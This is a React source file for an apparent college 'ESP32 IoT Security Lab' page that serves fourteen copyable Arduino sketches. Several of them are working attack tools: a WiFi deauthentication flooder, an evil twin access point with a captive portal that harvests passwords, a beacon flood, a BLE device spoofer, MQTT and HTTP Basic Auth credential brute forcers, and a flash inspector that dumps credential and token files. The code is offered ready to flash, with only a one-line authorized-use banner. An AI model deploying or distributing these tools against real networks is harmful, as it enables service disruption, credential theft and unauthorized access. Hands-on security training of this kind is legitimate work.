import { useState } from "react";

const CATS = [
  { id: "recon",    label: "WiFi Recon",      icon: "📡", color: "#22c55e" },
  { id: "attacks",  label: "WiFi Attacks",    icon: "⚡", color: "#f59e0b" },
  { id: "ble",      label: "BLE Security",    icon: "🔵", color: "#3b82f6" },
  { id: "network",  label: "Network",         icon: "🌐", color: "#a855f7" },
  { id: "hardware", label: "Hardware",        icon: "🔧", color: "#ef4444" },
];

const CODES = {
  recon: [
    {
      title: "1. WiFi Network Scanner",
      libs: ["WiFi.h"],
      code: `#include <WiFi.h>

const char* encStr(wifi_auth_mode_t e) {
  switch(e) {
    case WIFI_AUTH_OPEN:         return "OPEN";
    case WIFI_AUTH_WEP:          return "WEP";
    case WIFI_AUTH_WPA_PSK:      return "WPA";
    case WIFI_AUTH_WPA2_PSK:     return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA3_PSK:     return "WPA3";
    default:                     return "UNK";
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  Serial.println("[*] ESP32 WiFi Scanner ready");
}

void loop() {
  int n = WiFi.scanNetworks();
  Serial.printf("\\n[*] Found %d APs:\\n", n);
  Serial.println(" # | SSID                       | BSSID             | CH | RSSI | ENC");
  for (int i = 0; i < n; i++) {
    Serial.printf("%2d | %-26s | %s | %2d | %4d | %s\\n",
      i+1, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(),
      WiFi.channel(i), WiFi.RSSI(i), encStr(WiFi.encryptionType(i)));
  }
  WiFi.scanDelete();
  delay(5000);
}`
    },
    {
      title: "2. Probe Request Sniffer",
      libs: ["esp_wifi.h", "nvs_flash.h"],
      code: `#include <esp_wifi.h>
#include <nvs_flash.h>
#include <map>
#include <set>
#include <string>

std::map<std::string, std::set<std::string>> seen;

typedef struct {
  unsigned frame_ctrl:16, duration:16;
  uint8_t  dst[6], src[6], bssid[6];
  unsigned seq:16;
} mgmt_hdr_t;

void IRAM_ATTR sniffCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  mgmt_hdr_t* h = (mgmt_hdr_t*)p->payload;
  if ((h->frame_ctrl & 0x00FC) != 0x0040) return; // Probe Req

  uint8_t* body = p->payload + sizeof(mgmt_hdr_t);
  uint8_t ssid_len = body[1];
  char ssid[33] = "<any>";
  if (body[0]==0 && ssid_len>0 && ssid_len<33) {
    memcpy(ssid, body+2, ssid_len); ssid[ssid_len]=0;
  }
  char mac[18];
  snprintf(mac,18,"%02X:%02X:%02X:%02X:%02X:%02X",
    h->src[0],h->src[1],h->src[2],h->src[3],h->src[4],h->src[5]);

  std::string m(mac), s(ssid);
  if (!seen[m].count(s)) {
    seen[m].insert(s);
    Serial.printf("[PROBE] %s -> \\"%s\\" (RSSI:%d)\\n",mac,ssid,p->rx_ctrl.rssi);
  }
}

int ch=1; unsigned long lastHop=0;

void setup() {
  Serial.begin(115200);
  nvs_flash_init();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffCB);
  Serial.println("[*] Probe sniffer active");
}

void loop() {
  if (millis()-lastHop > 500) {
    ch = (ch%13)+1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    lastHop = millis();
  }
}`
    },
    {
      title: "3. Promiscuous Packet Sniffer",
      libs: ["esp_wifi.h", "nvs_flash.h"],
      code: `#include <esp_wifi.h>
#include <nvs_flash.h>

typedef struct {
  unsigned fc:16, dur:16;
  uint8_t addr1[6], addr2[6], addr3[6];
  unsigned seq:16;
} ieee80211_t;

const char* ftype(uint16_t fc) {
  switch((fc>>2)&0x3F) {
    case 0x04: return "PROBE-REQ";
    case 0x08: return "BEACON   ";
    case 0x0B: return "AUTH     ";
    case 0x0C: return "DEAUTH   ";
    case 0x20: return "DATA     ";
    default:   return "OTHER    ";
  }
}

void IRAM_ATTR rxCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  ieee80211_t* h = (ieee80211_t*)p->payload;
  Serial.printf("[%s] CH:%2d RSSI:%4d SRC:%02X:%02X:%02X:%02X:%02X:%02X\\n",
    ftype(h->fc), p->rx_ctrl.channel, p->rx_ctrl.rssi,
    h->addr2[0],h->addr2[1],h->addr2[2],
    h->addr2[3],h->addr2[4],h->addr2[5]);
}

int ch=1; unsigned long lastHop=0;

void setup() {
  Serial.begin(115200);
  nvs_flash_init();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  wifi_promiscuous_filter_t f={.filter_mask=WIFI_PROMIS_FILTER_MASK_ALL};
  esp_wifi_set_promiscuous_filter(&f);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&rxCB);
  Serial.println("[*] Monitor mode ON");
}

void loop() {
  if (millis()-lastHop > 1000) {
    ch = (ch%13)+1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    Serial.printf("\\n--- CH %d ---\\n", ch);
    lastHop = millis();
  }
}`
    },
  ],
  attacks: [
    {
      title: "4. Deauthentication Attack",
      libs: ["esp_wifi.h", "nvs_flash.h"],
      code: `#include <esp_wifi.h>
#include <nvs_flash.h>
#include <string.h>

// ===== SET BEFORE UPLOAD =====
uint8_t AP_MAC[]  = {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF}; // Target AP BSSID
uint8_t CLI_MAC[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};   // FF = broadcast all
uint8_t CH = 6;
int BURSTS = 10;
// =============================

uint8_t frame[26] = {
  0xC0,0x00, 0x3A,0x01,
  0x00,0x00,0x00,0x00,0x00,0x00,  // addr1: client
  0x00,0x00,0x00,0x00,0x00,0x00,  // addr2: AP
  0x00,0x00,0x00,0x00,0x00,0x00,  // addr3: BSSID
  0x00,0x00, 0x07,0x00
};

void setup() {
  Serial.begin(115200);
  nvs_flash_init();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  esp_wifi_set_channel(CH, WIFI_SECOND_CHAN_NONE);
  memcpy(frame+4,  CLI_MAC, 6);
  memcpy(frame+10, AP_MAC,  6);
  memcpy(frame+16, AP_MAC,  6);
  Serial.printf("[*] Deauth -> AP %02X:%02X:%02X:%02X:%02X:%02X CH%d\\n",
    AP_MAC[0],AP_MAC[1],AP_MAC[2],AP_MAC[3],AP_MAC[4],AP_MAC[5],CH);
}

void loop() {
  for (int i=0; i<BURSTS; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    delay(5);
  }
  Serial.printf("[*] Sent %d deauth frames\\n", BURSTS);
  delay(1000);
}`
    },
    {
      title: "5. Evil Twin AP + Captive Portal",
      libs: ["WiFi.h", "WebServer.h", "DNSServer.h"],
      code: `#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const char* AP_SSID = "Free_Airport_WiFi"; // Clone target SSID

DNSServer dns;
WebServer srv(80);

const char PAGE[] PROGMEM = R"rawhtml(
<!DOCTYPE html><html><head>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Network Login</title><style>
body{font-family:Arial;max-width:380px;margin:50px auto;padding:16px}
input{width:100%;padding:8px;margin:6px 0;box-sizing:border-box;border:1px solid #ccc}
button{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;cursor:pointer}
</style></head><body>
<h2>WiFi Login Required</h2>
<form method='POST' action='/login'>
  Username<br><input name='u' type='text'><br>
  Password<br><input name='p' type='password'><br><br>
  <button>Connect to Internet</button>
</form></body></html>)rawhtml";

void root()  { srv.send(200,"text/html",PAGE); }
void login() {
  Serial.printf("[CAPTURE] user=%s  pass=%s  from=%s\\n",
    srv.arg("u").c_str(), srv.arg("p").c_str(),
    srv.client().remoteIP().toString().c_str());
  srv.send(200,"text/html","<h3>Connecting... please wait.</h3>");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID);
  IPAddress ip = WiFi.softAPIP();
  dns.start(53, "*", ip);
  srv.on("/", HTTP_GET, root);
  srv.on("/login", HTTP_POST, login);
  srv.onNotFound(root);
  srv.begin();
  Serial.printf("[*] Evil Twin '%s' live at %s\\n", AP_SSID, ip.toString().c_str());
}

void loop() {
  dns.processNextRequest();
  srv.handleClient();
}`
    },
    {
      title: "6. Beacon Flood (Fake AP Spam)",
      libs: ["esp_wifi.h", "nvs_flash.h"],
      code: `#include <esp_wifi.h>
#include <nvs_flash.h>
#include <string.h>

const char* SSIDS[] = {
  "FBI_Surveillance_Van_3", "Pretty_Fly_for_a_WiFi",
  "Everyday_Im_Buffering",  "Abraham_Linksys",
  "The_Promised_LAN",       "Silence_of_the_LANs",
  "I_Believe_Wi_Can_Fi",    "Not_Your_Grandmas_WiFi"
};
const int N = 8;

const uint8_t BCN_HEAD[] = {
  0x80,0x00,0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x64,0x00, 0x31,0x04, 0x00
};
uint8_t buf[200];

void sendBeacon(const char* ssid) {
  uint8_t mac[6]={0x02,(uint8_t)random(256),(uint8_t)random(256),
                       (uint8_t)random(256),(uint8_t)random(256),(uint8_t)random(256)};
  int slen=strlen(ssid);
  memcpy(buf,BCN_HEAD,sizeof(BCN_HEAD));
  memcpy(buf+10,mac,6); memcpy(buf+16,mac,6);
  buf[sizeof(BCN_HEAD)]=slen;
  memcpy(buf+sizeof(BCN_HEAD)+1,ssid,slen);
  int pos=sizeof(BCN_HEAD)+1+slen;
  uint8_t rates[]={0x01,0x08,0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
  memcpy(buf+pos,rates,10); pos+=10;
  buf[pos++]=0x03;buf[pos++]=0x01;buf[pos++]=6;
  esp_wifi_80211_tx(WIFI_IF_AP,buf,pos,false);
}

void setup() {
  Serial.begin(115200);
  nvs_flash_init();
  wifi_init_config_t cfg=WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_mode(WIFI_MODE_AP);
  wifi_config_t ap={};
  strcpy((char*)ap.ap.ssid,"ESP32"); ap.ap.channel=6;
  esp_wifi_set_config(WIFI_IF_AP,&ap);
  esp_wifi_start();
  Serial.printf("[*] Beacon Flood — %d fake SSIDs\\n",N);
}

void loop() {
  for(int i=0;i<N;i++){sendBeacon(SSIDS[i]);delay(5);}
  delay(200);
}`
    },
  ],
  ble: [
    {
      title: "7. BLE Active Scanner",
      libs: ["BLEDevice.h", "BLEScan.h"],
      code: `#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

BLEScan* pScan;

class ScanCB : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    Serial.printf("\\n[BLE] %-28s  %s  RSSI:%d\\n",
      dev.getName().length() ? dev.getName().c_str() : "(hidden)",
      dev.getAddress().toString().c_str(), dev.getRSSI());
    Serial.printf("      Type: %s\\n",
      dev.getAddress().getType()==BLE_ADDR_TYPE_PUBLIC?"PUBLIC":"RANDOM");
    if (dev.haveServiceUUID())
      Serial.printf("      UUID: %s\\n",dev.getServiceUUID().toString().c_str());
    if (dev.haveManufacturerData()) {
      std::string md=dev.getManufacturerData();
      Serial.printf("      Mfr : ");
      for(uint8_t c:md) Serial.printf("%02X ",c);
      if(md.size()>=2){
        uint16_t v=(uint8_t)md[0]|((uint8_t)md[1]<<8);
        if(v==0x004C) Serial.print("(Apple)");
        else if(v==0x0006) Serial.print("(Microsoft)");
        else if(v==0x0075) Serial.print("(Samsung)");
        else if(v==0x00E0) Serial.print("(Google)");
      }
      Serial.println();
    }
  }
};

void setup() {
  Serial.begin(115200);
  BLEDevice::init("ESP32_Scanner");
  pScan=BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new ScanCB());
  pScan->setActiveScan(true);
  pScan->setInterval(100); pScan->setWindow(99);
  Serial.println("[*] BLE Active Scanner running");
}

void loop() {
  Serial.println("\\n[*] Scanning 5 sec...");
  BLEScanResults r=pScan->start(5,false);
  Serial.printf("[*] Found: %d\\n",r.getCount());
  pScan->clearResults();
  delay(3000);
}`
    },
    {
      title: "8. BLE Device Spoofer",
      libs: ["BLEDevice.h", "BLEAdvertising.h"],
      code: `#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEAdvertising.h>

struct FakeDev { const char* name; const char* uuid; uint16_t appearance; };
FakeDev DEVS[] = {
  {"Tile_Tracker",  "0000feed-0000-1000-8000-00805f9b34fb", 0x0180},
  {"Mi_Band_7",     "0000fee0-0000-1000-8000-00805f9b34fb", 0x0180},
  {"HeartRate_Mon", "0000180d-0000-1000-8000-00805f9b34fb", 0x0341},
  {"Smart_Bulb",    "0000ffe0-0000-1000-8000-00805f9b34fb", 0x07C0},
  {"BLE_Keyboard",  "00001812-0000-1000-8000-00805f9b34fb", 0x03C1},
};
int idx=0; BLEAdvertising* pAdv;

void spoof(FakeDev& d) {
  pAdv->stop(); BLEDevice::deinit(false); BLEDevice::init(d.name);
  pAdv=BLEDevice::getAdvertising();
  BLEAdvertisementData adv;
  adv.setName(d.name); adv.setAppearance(d.appearance); adv.setFlags(0x06);
  BLEAdvertisementData scan;
  scan.setCompleteServices(BLEUUID(d.uuid));
  pAdv->setAdvertisementData(adv);
  pAdv->setScanResponseData(scan);
  pAdv->setScanResponse(true); pAdv->start();
  Serial.printf("[SPOOF] %s  UUID:%s  MAC:%s\\n",
    d.name,d.uuid,BLEDevice::getAddress().toString().c_str());
}

void setup() {
  Serial.begin(115200);
  BLEDevice::init("ESP32"); pAdv=BLEDevice::getAdvertising();
  Serial.println("[*] BLE Spoofer — cycling every 5s");
  spoof(DEVS[0]);
}

void loop() {
  delay(5000); idx=(idx+1)%5; spoof(DEVS[idx]);
}`
    },
  ],
  network: [
    {
      title: "9. MQTT Credential Brute Forcer",
      libs: ["WiFi.h", "PubSubClient.h"],
      code: `#include <WiFi.h>
#include <PubSubClient.h>

#define WIFI_SSID  "YourWiFi"
#define WIFI_PASS  "YourPassword"
#define MQTT_HOST  "192.168.1.100"
#define MQTT_PORT  1883

const char* U[]={"admin","user","root","mqtt","guest",""};
const char* P[]={"admin","password","123456","mqtt","root","1234",""};
const int UL=6, PL=7;

WiFiClient net; PubSubClient mqtt(net); bool found=false;

void onMsg(char* t,byte* m,unsigned int l){
  Serial.printf("[MSG] [%s]: ",t);
  for(unsigned i=0;i<l;i++) Serial.print((char)m[i]);
  Serial.println();
}

bool tryLogin(const char* u,const char* p){
  String id="esp_"+String(random(0xFFFF),HEX);
  return mqtt.connect(id.c_str(),*u?u:NULL,*p?p:NULL);
}

void setup(){
  Serial.begin(115200);
  WiFi.begin(WIFI_SSID,WIFI_PASS);
  while(WiFi.status()!=WL_CONNECTED){delay(500);Serial.print(".");}
  Serial.printf("\\n[*] MQTT BruteForce -> %s:%d\\n\\n",MQTT_HOST,MQTT_PORT);
  mqtt.setServer(MQTT_HOST,MQTT_PORT); mqtt.setCallback(onMsg);

  for(int u=0;u<UL&&!found;u++){
    for(int p=0;p<PL&&!found;p++){
      Serial.printf("[*] [%s]:[%s] ... ",U[u],P[p]);
      if(tryLogin(U[u],P[p])){
        Serial.println("SUCCESS!");
        mqtt.subscribe("#");
        Serial.printf("[+] Subscribed to '#' — ALL messages intercepted\\n");
        found=true;
      } else {
        Serial.printf("fail (rc=%d)\\n",mqtt.state());
        mqtt.disconnect(); delay(300);
      }
    }
  }
  if(!found) Serial.println("[-] No credentials found.");
}

void loop(){
  if(found&&mqtt.connected()) mqtt.loop();
}`
    },
    {
      title: "10. HTTP Basic Auth Brute Force",
      libs: ["WiFi.h", "HTTPClient.h", "base64.h"],
      code: `#include <WiFi.h>
#include <HTTPClient.h>
#include <base64.h>

#define WIFI_SSID "YourWiFi"
#define WIFI_PASS "YourPassword"
#define TARGET    "http://192.168.1.1/admin"

const char* U[]={"admin","root","user","guest","support"};
const char* P[]={"admin","root","password","123456","1234","admin123","","default"};
const int UL=5, PL=8;

WiFiClient net; HTTPClient http;

int tryAuth(const char* u,const char* p){
  http.begin(net,TARGET);
  http.addHeader("Authorization","Basic "+base64::encode(String(u)+":"+p));
  http.addHeader("User-Agent","Mozilla/5.0");
  int code=http.GET(); http.end(); return code;
}

void setup(){
  Serial.begin(115200);
  WiFi.begin(WIFI_SSID,WIFI_PASS);
  while(WiFi.status()!=WL_CONNECTED){delay(500);Serial.print(".");}
  Serial.printf("\\n[*] HTTP BasicAuth -> %s\\n\\n",TARGET);

  for(int u=0;u<UL;u++){
    for(int p=0;p<PL;p++){
      Serial.printf("[*] %-12s : %-10s -> ",U[u],P[p]);
      int code=tryAuth(U[u],P[p]);
      Serial.printf("HTTP %d\\n",code);
      if(code==200||code==302){
        Serial.printf("\\n[+] SUCCESS: %s / %s\\n",U[u],P[p]);
        return;
      }
      delay(300);
    }
  }
  Serial.println("\\n[-] All combinations exhausted.");
}
void loop(){}` 
    },
    {
      title: "11. IoT Port Scanner",
      libs: ["WiFi.h", "WiFiClient.h"],
      code: `#include <WiFi.h>
#include <WiFiClient.h>

#define WIFI_SSID "YourWiFi"
#define WIFI_PASS "YourPassword"
#define TARGET_IP "192.168.1.1"

struct Port{int n;const char* svc;};
Port PORTS[]={
  {21,"FTP"},{22,"SSH"},{23,"Telnet"},{80,"HTTP"},
  {443,"HTTPS"},{502,"Modbus"},{1883,"MQTT"},{4840,"OPC-UA"},
  {5683,"CoAP"},{8080,"HTTP-Alt"},{8883,"MQTT-TLS"},
  {9200,"Elasticsearch"},{27017,"MongoDB"},
  {6379,"Redis"},{3306,"MySQL"},{47808,"BACnet"}
};
const int CNT=16;

void setup(){
  Serial.begin(115200);
  WiFi.begin(WIFI_SSID,WIFI_PASS);
  while(WiFi.status()!=WL_CONNECTED){delay(500);Serial.print(".");}
  Serial.printf("\\n[*] Scanning %s\\n\\n",TARGET_IP);
  Serial.println(" PORT  | SERVICE       | STATE  | BANNER");
  Serial.println("-------+---------------+--------+-------------------------");

  for(int i=0;i<CNT;i++){
    WiFiClient c; c.setTimeout(600);
    Serial.printf("%5d  | %-13s | ",PORTS[i].n,PORTS[i].svc);
    if(c.connect(TARGET_IP,PORTS[i].n)){
      Serial.print("OPEN   | ");
      delay(300);
      if(c.available()){
        String b=c.readStringUntil('\\n'); b.trim();
        if(b.length()>40) b=b.substring(0,40)+"...";
        Serial.print(b);
      } else Serial.print("(no banner)");
      c.stop();
    } else Serial.print("closed |");
    Serial.println(); delay(100);
  }
  Serial.println("\\n[*] Scan complete.");
}
void loop(){}`
    },
  ],
  hardware: [
    {
      title: "12. I2C Bus Scanner",
      libs: ["Wire.h"],
      code: `#include <Wire.h>

struct Dev{uint8_t a;const char* n;};
Dev KNOWN[]={
  {0x20,"PCF8574 I/O"},{0x27,"PCF8574 LCD"},
  {0x3C,"SSD1306 OLED"},{0x48,"ADS1115 ADC"},
  {0x50,"AT24C32 EEPROM"},{0x51,"AT24Cxx EEPROM"},
  {0x53,"ADXL345 Accel"},{0x57,"AT24Cxx EEPROM"},
  {0x68,"MPU-6050 / DS3231"},{0x69,"MPU-6050 alt"},
  {0x76,"BME280"},{0x77,"BME680 / BMP280"},
  {0x23,"BH1750 Light"},{0x29,"VL53L0X ToF"},
};
const int NK=14;

const char* identify(uint8_t a){
  for(int i=0;i<NK;i++) if(KNOWN[i].a==a) return KNOWN[i].n;
  return "Unknown";
}

void setup(){
  Serial.begin(115200);
  Wire.begin(21,22); Wire.setClock(100000); delay(1000);
  Serial.println("[*] I2C Bus Scanner  SDA=21  SCL=22");
  Serial.println("=====================================");
  int found=0;
  for(uint8_t a=1;a<127;a++){
    Wire.beginTransmission(a);
    uint8_t e=Wire.endTransmission();
    if(e==0){found++;Serial.printf("[+] 0x%02X -> %s\\n",a,identify(a));}
    else if(e==4){Serial.printf("[!] 0x%02X -> Bus error\\n",a);}
    delay(5);
  }
  Serial.printf("\\n[*] Found %d device(s)\\n",found);
}
void loop(){}`
    },
    {
      title: "13. I2C EEPROM Hex Dumper",
      libs: ["Wire.h"],
      code: `#include <Wire.h>

#define EEPROM_ADDR 0x50    // AT24C32 default
#define EEPROM_SIZE 4096    // 4KB | AT24C256 = 32768
#define SDA_PIN     21
#define SCL_PIN     22

byte readByte(uint16_t addr){
  Wire.beginTransmission(EEPROM_ADDR);
  Wire.write((addr>>8)&0xFF);
  Wire.write(addr&0xFF);
  Wire.endTransmission();
  Wire.requestFrom(EEPROM_ADDR,1);
  return Wire.available()?Wire.read():0xFF;
}

void setup(){
  Serial.begin(115200);
  Wire.begin(SDA_PIN,SCL_PIN); Wire.setClock(400000); delay(500);
  Serial.printf("[*] EEPROM Dump 0x%02X — %d bytes\\n\\n",EEPROM_ADDR,EEPROM_SIZE);
  Serial.println("         00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F  | ASCII");
  Serial.println("---------+-------------------------------+------------------+-------");

  for(int base=0;base<EEPROM_SIZE;base+=16){
    Serial.printf("0x%04X : ",base);
    char asc[17]={0};
    for(int j=0;j<16&&(base+j)<EEPROM_SIZE;j++){
      byte b=readByte(base+j);
      if(j==8) Serial.print(" ");
      Serial.printf("%02X ",b);
      asc[j]=(b>=0x20&&b<0x7F)?(char)b:'.';
      delay(2);
    }
    Serial.printf(" | %s\\n",asc);
  }
  Serial.println("\\n[*] Dump complete.");
}
void loop(){}`
    },
    {
      title: "14. SPIFFS Flash Inspector",
      libs: ["SPIFFS.h", "FS.h"],
      code: `#include <SPIFFS.h>
#include <FS.h>

const char* SENSITIVE[]={
  "/config.json","/settings.json","/wifi.txt",
  "/credentials.txt","/api_key.txt","/passwd",
  "/auth.dat","/token.txt","/cert.pem","/secrets.h"
};
const int SN=10;

void setup(){
  Serial.begin(115200); delay(1000);
  if(!SPIFFS.begin(true)){Serial.println("[-] Mount failed");return;}
  Serial.printf("[*] SPIFFS  Total:%d  Used:%d  Free:%d bytes\\n\\n",
    SPIFFS.totalBytes(),SPIFFS.usedBytes(),
    SPIFFS.totalBytes()-SPIFFS.usedBytes());

  File root=SPIFFS.open("/"); File f=root.openNextFile();
  Serial.println("--- FILE LISTING ---");
  while(f){
    Serial.printf("[%6d B] /%s\\n",f.size(),f.name());
    Serial.print("  Preview: ");
    int lim=min((size_t)80,(size_t)f.size());
    for(int i=0;i<lim;i++){char c=(char)f.read();Serial.print(isPrintable(c)?c:'.');}
    Serial.println();
    f=root.openNextFile();
  }
  root.close();

  Serial.println("\\n--- SENSITIVE FILE SCAN ---");
  bool any=false;
  for(int i=0;i<SN;i++){
    if(SPIFFS.exists(SENSITIVE[i])){
      any=true;
      Serial.printf("\\n[!!!] FOUND: %s\\n",SENSITIVE[i]);
      File sf=SPIFFS.open(SENSITIVE[i]);
      Serial.println(sf.readString()); sf.close();
    }
  }
  if(!any) Serial.println("    No sensitive files found.");
  Serial.println("\\n[*] Done.");
}
void loop(){}`
    },
  ],
};

const total = Object.values(CODES).reduce((s,a)=>s+a.length,0);

export default function App() {
  const [tab, setTab] = useState("recon");
  const [open, setOpen] = useState({});
  const [copied, setCopied] = useState(null);

  const cat = CATS.find(c => c.id === tab);
  const codes = CODES[tab] || [];

  const toggle = (key) => setOpen(p => ({ ...p, [key]: !p[key] }));

  const copy = async (code, key) => {
    try { await navigator.clipboard.writeText(code); }
    catch {
      const t = document.createElement("textarea");
      t.value = code; document.body.appendChild(t);
      t.select(); document.execCommand("copy");
      document.body.removeChild(t);
    }
    setCopied(key);
    setTimeout(() => setCopied(null), 2000);
  };

  return (
    <div style={{ background: "#0d1117", minHeight: "100vh", color: "#e6edf3", fontFamily: "monospace", padding: "16px" }}>
      {/* Header */}
      <div style={{ textAlign: "center", marginBottom: "20px" }}>
        <div style={{ fontSize: "24px", marginBottom: "4px" }}>🔐</div>
        <div style={{ color: "#58a6ff", fontSize: "18px", fontWeight: "bold", letterSpacing: "2px" }}>
          ESP32 IoT SECURITY LAB
        </div>
        <div style={{ color: "#6e7681", fontSize: "11px", marginTop: "4px" }}>
          KLS GIT Belagavi &nbsp;·&nbsp; {total} modules &nbsp;·&nbsp; Arduino Framework
        </div>
        <div style={{ marginTop: "10px", background: "#161b22", border: "1px solid #d29922", borderRadius: "6px", padding: "7px 14px", display: "inline-block", fontSize: "11px", color: "#d29922" }}>
          ⚠️ Authorized lab use only — isolated environment required
        </div>
      </div>

      {/* Tabs */}
      <div style={{ display: "flex", gap: "6px", flexWrap: "wrap", marginBottom: "14px" }}>
        {CATS.map(c => (
          <button key={c.id} onClick={() => { setTab(c.id); setOpen({}); }}
            style={{
              padding: "7px 14px", borderRadius: "16px", cursor: "pointer", fontSize: "12px",
              fontFamily: "monospace", border: `1px solid ${tab === c.id ? c.color : "#30363d"}`,
              background: tab === c.id ? c.color + "22" : "#161b22",
              color: tab === c.id ? c.color : "#6e7681"
            }}>
            {c.icon} {c.label} ({CODES[c.id].length})
          </button>
        ))}
      </div>

      {/* Section label */}
      <div style={{ background: "#161b22", border: `1px solid ${cat.color}44`, borderRadius: "8px", padding: "8px 14px", marginBottom: "12px", display: "flex", alignItems: "center", gap: "10px" }}>
        <div style={{ width: "3px", height: "28px", background: cat.color, borderRadius: "2px" }} />
        <div>
          <div style={{ color: cat.color, fontSize: "13px", fontWeight: "bold" }}>{cat.icon} {cat.label}</div>
          <div style={{ color: "#6e7681", fontSize: "10px" }}>{codes.length} module{codes.length !== 1 ? "s" : ""}</div>
        </div>
      </div>

      {/* Code cards */}
      {codes.map((item, i) => {
        const key = `${tab}-${i}`;
        const isOpen = !!open[key];
        const isCopied = copied === key;
        return (
          <div key={key} style={{ background: "#161b22", border: "1px solid #30363d", borderRadius: "8px", marginBottom: "10px", overflow: "hidden" }}>
            <div style={{ height: "3px", background: cat.color }} />
            <div style={{ padding: "12px 14px" }}>
              <div style={{ color: "#c9d1d9", fontWeight: "bold", fontSize: "13px", marginBottom: "4px" }}>{item.title}</div>
              <div style={{ display: "flex", gap: "5px", flexWrap: "wrap", marginBottom: "10px" }}>
                {item.libs.map(l => (
                  <span key={l} style={{ background: "#0d1117", color: "#58a6ff", padding: "2px 8px", borderRadius: "10px", fontSize: "10px", border: "1px solid #30363d" }}>
                    #{l}
                  </span>
                ))}
              </div>
              <div style={{ display: "flex", gap: "8px" }}>
                <button onClick={() => toggle(key)}
                  style={{ padding: "5px 14px", borderRadius: "6px", background: "#21262d", color: "#c9d1d9", border: "1px solid #30363d", cursor: "pointer", fontSize: "11px", fontFamily: "monospace" }}>
                  {isOpen ? "▲ Hide" : "▼ Show Code"}
                </button>
                <button onClick={() => copy(item.code, key)}
                  style={{ padding: "5px 14px", borderRadius: "6px", border: "none", cursor: "pointer", fontFamily: "monospace", fontSize: "11px", fontWeight: "bold", background: isCopied ? "#238636" : "#1f6feb", color: "white" }}>
                  {isCopied ? "✓ Copied!" : "⎘ Copy"}
                </button>
              </div>
            </div>
            {isOpen && (
              <pre style={{ margin: 0, padding: "14px 16px", background: "#010409", fontSize: "11px", lineHeight: "1.65", color: "#e6edf3", borderTop: "1px solid #30363d", overflowX: "auto", maxHeight: "500px", overflowY: "auto" }}>
                <code>{item.code}</code>
              </pre>
            )}
          </div>
        );
      })}

      <div style={{ textAlign: "center", marginTop: "24px", color: "#484f58", fontSize: "10px", lineHeight: "1.8" }}>
        KLS Gogte Institute of Technology, Belagavi<br />
        All codes for authorized IoT security training only
      </div>
    </div>
  );
}
